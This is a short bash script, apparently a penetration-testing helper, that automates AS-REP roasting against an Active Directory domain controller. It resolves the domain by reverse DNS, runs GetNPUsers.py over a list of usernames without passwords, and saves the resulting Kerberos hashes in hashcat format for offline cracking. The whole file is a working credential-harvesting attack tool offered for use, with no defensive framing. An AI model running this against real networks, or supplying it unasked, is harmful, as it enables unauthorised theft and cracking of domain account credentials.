#!/bin/bash

# Function to display usage
usage() {
    printf "\nSyntax: gethash.sh <DC IP address> <usernames file>\n"
    printf "Example: ./gethash.sh 192.168.1.100 usernames.txt\n\n"
}

# Check for root privileges
if [ "$(id -u)" -ne 0 ]; then
    printf "Please run as root\n"
    exit 1
fi

# Check if the required number of arguments was provided
if [ $# -ne 2 ]; then
    printf "Incorrect number of arguments supplied\n"
    usage
    exit 1
fi

DC_IP="$1"
USERNAMES_FILE="$2"
OUTPUT_FILE="hashes_${DC_IP//./_}.txt"

# Check if the usernames file exists
if [ ! -f "$USERNAMES_FILE" ]; then
    printf "Error: Usernames file %s not found.\n" "$USERNAMES_FILE"
    exit 1
fi

# Attempt to find the domain via reverse DNS lookup
DOMAIN=$(dig +short -x "$DC_IP" | sed 's/\.$//')

if [ -z "$DOMAIN" ]; then
    printf "Error: Domain could not be determined from IP address.\n"
    read -rp "Please enter the domain manually: " DOMAIN
fi

# Validate domain input
if [ -z "$DOMAIN" ]; then
    printf "No domain entered. Exiting.\n"
    exit 1
fi

# Check for required tool (GetNPUsers.py)
if [ ! -f "/usr/local/bin/GetNPUsers.py" ]; then
    printf "Error: GetNPUsers.py not found in /usr/local/bin.\n"
    exit 1
fi

# Run GetNPUsers.py
printf "Getting user hashes for domain: %s\n" "$DOMAIN"
python /usr/local/bin/GetNPUsers.py "$DOMAIN/" -no-pass -usersfile "$USERNAMES_FILE" -format hashcat -outputfile "$OUTPUT_FILE"

printf "User hashes saved to %s.\n" "$OUTPUT_FILE"
